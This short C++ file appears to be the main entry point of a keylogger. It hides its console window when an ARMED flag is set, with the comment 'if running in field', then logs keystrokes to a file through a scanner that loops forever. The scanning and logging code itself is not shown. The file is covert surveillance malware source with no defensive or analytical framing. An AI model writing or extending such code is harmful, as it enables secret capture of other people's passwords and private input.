#include "pch.h"

#include "log/logFILE/file.h"
#include "keyscan/keyscan.h"

int main() {
	//if running in field hide console
	if (ARMED) FreeConsole();
	//scanning from hereon
	auto* l = new logFILE(FNAME);
	keyscan scanner(l);
	scanner.scan();
	//will never be reached
	return 1;
}